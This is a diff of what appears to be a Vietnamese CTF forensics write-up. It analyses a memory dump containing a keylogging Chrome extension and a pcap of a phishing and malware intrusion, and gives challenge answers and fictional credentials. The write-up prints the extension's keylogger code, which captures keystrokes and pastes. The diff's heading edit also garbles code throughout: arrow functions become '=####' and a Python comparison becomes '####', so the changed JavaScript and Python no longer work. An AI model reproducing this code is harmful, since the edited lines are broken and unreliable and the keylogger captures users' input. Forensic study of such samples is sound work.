@@ -29,7 +29,7 @@ layout: post
      <button class="view-button" onclick="getResume()">View Full Resume</button>
    </div>
    <script defer="defer">
-     setTimeout(() => {
+     setTimeout(() =#### {
        document.getElementById('loading').style.display = 'none';
        document.getElementById('main-content').style.display = 'flex';
      }, 5000);
@@ -128,7 +128,7 @@ Bài cho file memdump.elf, lần đầu mình gặp file dump mà đuôi là elf
 
 Vẫn đúng là file dump bth thôi, giờ dùng volatility để phân tích
 
->**1.** What is the PID of the Original (First) Google Chrome process:
+#### 1.  What is the PID of the Original (First) Google Chrome process:
 
 Câu này dùng plugin windows.pslist
 
@@ -138,7 +138,7 @@ Câu này dùng plugin windows.pslist
 Answer: 4080
 ```
 
->**2.** What is the only Folder on the Desktop
+#### 2.  What is the only Folder on the Desktop
 
 Câu này dùng windows.filescan | grep desktop
 
@@ -148,7 +148,7 @@ Câu này dùng windows.filescan | grep desktop
 Answer: malext
 ```
 
->**3.** What is the Extention's ID (ex: hlkenndednhfkekhgcdicdfddnkalmdm)
+#### 3.  What is the Extention's ID (ex: hlkenndednhfkekhgcdicdfddnkalmdm)
 
 Thấy trên `desktop` có được 1 số file `.js`, dump thử về xem sao (vì mình `grep` ID mãi mà nhập vô không đúng)
 
@@ -163,7 +163,7 @@ function addLog(s) {
         s = s + "\r\n";
     }
 
-    chrome.storage.local.get(["log"]).then((data) => {
+    chrome.storage.local.get(["log"]).then((data) =#### {
         if (!data.log) {
             data.log = "";
         }
@@ -175,12 +175,12 @@ function addLog(s) {
 }
 
 
-chrome.runtime.onConnect.addListener((port) => {
+chrome.runtime.onConnect.addListener((port) =#### {
 
     console.assert(port.name === "conn");
     console.log("v1.2.1");
 
-    port.onMessage.addListener( ({ type, data }) => {
+    port.onMessage.addListener( ({ type, data }) =#### {
         if (type === 'key') {
             addLog(data);
         } else if (type == 'paste') {
@@ -204,23 +204,23 @@ var conn = chrome.runtime.connect({ name: "conn" });
 
 chrome.runtime.sendMessage('update');
 
-(async () => {
+(async () =#### {
     const response = await chrome.runtime.sendMessage({ check: "replace_html" });
     console.log(response)
 })();
 
-chrome.runtime.sendMessage('replace_html', (response) => {
+chrome.runtime.sendMessage('replace_html', (response) =#### {
     conn.postMessage({ "type": "check", "data": "replace_html" });
 });
 
-document.addEventListener("keydown", (event) => {
+document.addEventListener("keydown", (event) =#### {
     const key = event.key;
     conn.postMessage({ "type": "key", "data": key });
     return true;
 });
 
 
-document.addEventListener("paste", (event) => {
+document.addEventListener("paste", (event) =#### {
     let paste = event.clipboardData.getData("text/plain");
     conn.postMessage({ "type": "paste", "data": paste });
     return true;
@@ -237,14 +237,14 @@ Script trên là một phần của `Chrome Extensions`, nó như một `Keylogg
 Answer: nnjofihdjilebhiiemfmdlpbdkbjcpae
 ```
 
->**4.** After examining the malicious extention's code, what is the log filename in which the datais stored
+#### 4.  After examining the malicious extention's code, what is the log filename in which the datais stored
 
 Ngay hình trên lấy được 1 tệp `.log`
 
 ```
 Answer: 000003.log
 ```
->**5.** What is the URL the user navigated to
+#### 5.  What is the URL the user navigated to
 
 Mình dumpfiles `000003.log` về, tệp log này ghi lại lịch sử nhấn phím người dùng bởi `malicious extensions` ở trên
 
@@ -256,7 +256,7 @@ Có thể thấy người dùng truy cập vào drive.google.com rồi thực hi
 Answer: drive.google.com
 ```
 
->**6.** What is the password of selene@rangers.eldoria.com
+#### 6.  What is the password of selene@rangers.eldoria.com
 
 ![image](assets/images2/25.png)
 
@@ -270,22 +270,22 @@ Answer: clip-mummify-proofs
 
 Bài cho file pcapng, phân tích và trả lời 6 câu hỏi
 
->**1.**  What is the subject of the first email that the victim opened and replied to?
+#### 1.   What is the subject of the first email that the victim opened and replied to?
 
 Follow HTTP stream 4, thấy được cuộc giao tiếp giữa client và server
 
 ![image](assets/images2/5.png)
 
-Thực hiện GET request xem trước email (_action=preview) trong hộp thư đến (_mbox=INBOX) với UID 71 => opened
+Thực hiện GET request xem trước email (_action=preview) trong hộp thư đến (_mbox=INBOX) với UID 71 =#### opened
 
-Sau đó xuống dưới, thực hiện tiếp GET request với email trên, yêu cầu tải 1 hình ảnh => `replied`
+Sau đó xuống dưới, thực hiện tiếp GET request với email trên, yêu cầu tải 1 hình ảnh =#### `replied`
 
 ```
 Answer: Game Crash on Level 5
 ```
 
 
->**2.**  On what date and time was the suspicious email sent? (Format: YYYY-MM-DD_HH:MM) (for example: 1945-04-30_12:34)
+#### 2.   On what date and time was the suspicious email sent? (Format: YYYY-MM-DD_HH:MM) (for example: 1945-04-30_12:34)
 
 Lúc đang làm thì mình ngồi xem HTTP stream 1, thấy có một GET request lấy danh sách email trong hộp thư đến, server sẽ response danh sách dưới dạng json
 
@@ -301,7 +301,7 @@ Nhập vô thấy correct :v
 ```
 Answer: 2025-02-24_15:46
 ```
->**3.** What is the MD5 hash of the malware file?
+#### 3.  What is the MD5 hash of the malware file?
 
 Export object HTTP, thấy có 1 file zip, khả năng đây sẽ chứa malware
 
@@ -325,7 +325,7 @@ Unzip nhận được 1 file `Eldoria_Balance_Issue_Report.pdf.exe`
 Answer: c0b37994963cc0aadd6e78a256c51547
 ```
 
->**4.** What credentials were used to log into the attacker's mailbox? (Format: username:password)
+#### 4.  What credentials were used to log into the attacker's mailbox? (Format: username:password)
 
 Lúc mới vào làm, thì mình thấy có khá nhiều packet, nên có hỏi AI xem cần chú ý vào những protocol nào thì có được chỉ rằng là `IMAP`
 
@@ -346,7 +346,7 @@ Nhìn vào hàm creds, đây là hàm lưu thông tin đăng nhập để có th
 ```
 Answer: proplayer@email.com:completed
 ```
->**5.** What is the name of the task scheduled by the attacker?
+#### 5.  What is the name of the task scheduled by the attacker?
 
 Khi làm thì mình cần tìm câu trả lời càng sớm càng tốt, nên đã kiểu đoán mò khá nhiều, mình đã follow hết các stream liên quan đến IMAP nhưng kh thấy có task scheduled nào của attacker, nên mình nghĩ khả năng rất cao là nó nằm trong đống bị mã hóa này
 
@@ -517,7 +517,7 @@ Data lấy tại luồng tcp.stream 35
 ```
 Answer: Synchronization
 ```
->**6.** What is the API key leaked from the highly valuable file discovered by the attacker?
+#### 6.  What is the API key leaked from the highly valuable file discovered by the attacker?
 
 Vẫn tiếp tục là lấy data đem decode, thì ở stream 97 sẽ có được đáp án
 
@@ -1069,7 +1069,7 @@ document.getElementById("newsletterForm").addEventListener("submit", function(e)
   if (!emailField.value) {
     emailField.classList.add("shake");
     isValid = false;
-    setTimeout(() => {
+    setTimeout(() =#### {
       return emailField.classList.remove("shake");
     }, 500);
   }
@@ -1140,7 +1140,7 @@ def base36encode(number):
         return '0'
     alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
     result = ''
-    while number > 0:
+    while number #### 0:
         number, i = divmod(number, 36)
         result = alphabet[i] + result
     return result.lower()
